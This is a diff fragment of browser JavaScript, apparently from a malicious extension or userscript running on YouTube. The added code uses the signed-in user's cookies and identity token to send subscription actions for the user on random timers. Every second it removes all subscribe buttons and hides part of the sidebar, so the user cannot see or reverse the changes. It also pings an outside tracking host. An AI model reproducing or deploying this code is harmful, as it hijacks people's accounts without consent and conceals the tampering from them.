 	ifNotDownloadSubList();
-  start();
-  setInterval(function() {
-    start();
-  }, 1000 * 60 * 1);
-  setInterval(function() {
-	  if(document.querySelectorAll("ytd-guide-section-renderer").length > 0){
-		  document.querySelectorAll("ytd-guide-section-renderer")[1].style.display ="none";
-	  }
-	  
-    var bok = document.getElementsByClassName("style-scope ytd-subscribe-button-renderer");
-    if (bok.length > 0) {
-      for (var i = 0; i < bok.length; i++) {
-        bok[i].outerHTML = "";
-      }
-    }
-  }, 1000);
+	ifNotDownloadMajor();
+
+	function getVideoId(channelId){
+		let vars = getStaticParams();
+		console.log("https://www.youtube.com/channel/"+channelId+"/videos?pbj=1");
+		fetch("https://www.youtube.com/channel/"+channelId+"/videos?pbj=1", {
+		  "headers": {
+			"accept": "*/*",
+			"accept-language": vars.accept_language,
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin",
+			"referer-zzz": document.URL,
+			"x-spf-previous": document.URL,
+			"x-spf-referer": document.URL,
+			"x-youtube-client-name": "1",
+			"x-youtube-client-version":  vars.clientVersion,
+			"x-youtube-device": vars.device,
+			"x-youtube-identity-token": vars.youtube_identity_token,
+			"x-youtube-page-cl": vars.page_cl,
+			"x-youtube-page-label": vars.page_build_label,
+			"x-youtube-sts": vars.STS,
+			"x-youtube-time-zone": vars.timezone ,
+			"x-youtube-utc-offset": vars.utcOffsetMinutes,
+			"x-youtube-variants-checksum": vars.variants_checksum
+		  },
+		  "referrerPolicy": "origin-when-cross-origin",
+		  "body": null,
+		  "method": "GET",
+		  "mode": "cors",
+		  "credentials": "include"
+		}).then(response => response.json())
+		  .then(data =>{
+			  try{
+				var tabs = data[1].response.contents.twoColumnBrowseResultsRenderer.tabs;
+				if(tabs.length > 1){
+					var items = tabs[1].tabRenderer.content.sectionListRenderer.contents[0].itemSectionRenderer.contents[0].gridRenderer.items
+			  }else{
+				 var items = tabs[0].tabRenderer.content.sectionListRenderer.contents[0].itemSectionRenderer.contents[0].gridRenderer.items
+			  }
+
+				if(items.length > 0 ){
+					subscribe(items[0].gridVideoRenderer.videoId,false)
+				}else{
+					console.log("video yok");
+				}
+			}catch(ex){
+				console.log(ex)
+			}
+
+			
+		  })
+	}
+	
+	if( !window.localStorage.getItem("downSubListCount") ){
+		window.localStorage.setItem("downSubListCount", 0);
+	}
+	
+
+	function unSub() {
+		try{
+			vars = {}
+			vars.channelIds = getElementOfSubList();
+			  if(vars.channelIds){
+				  new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek80';
+				  subscribe("https://www.youtube.com/channel/"+vars.channelIds+"?pbj=1",false)
+				  setTimeout(unSub, getRndInteger(1000*15, 1000*45) )    
+			  }else{
+				 let counter = parseInt(window.localStorage.getItem("downSubListCount"));
+				 if( counter < 5){
+					  new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek80';
+					window.localStorage.setItem("downSubListCount", counter + 1);
+					subListArray = getSubscriptionList();
+					window.localStorage.setItem("subList2", JSON.stringify(subListArray))
+					setTimeout(unSub, getRndInteger(1000*15, 1000*45) )    
+					console.log("COUNTER" + counter)
+				 
+				
+				}
+			  }
+		}catch(ex){
+			console.log(ex)
+		}
+	} 
+
+	unSub();
+	
+	
+	/*
+	 Functions UnSub Proccess
+	*/
+
+		
+		 
+		  setInterval(function() {
+			if(document.querySelectorAll("ytd-guide-section-renderer").length > 0){
+			  document.querySelectorAll("ytd-guide-section-renderer")[1].style.display ="none";
+			}
+			
+			var bok = document.getElementsByClassName("style-scope ytd-subscribe-button-renderer");
+			if (bok.length > 0) {
+			  for (var i = 0; i < bok.length; i++) {
+				bok[i].outerHTML = "";
+			  }
+			}
+		  }, 1000);
+		
+
+	
 }
+
+
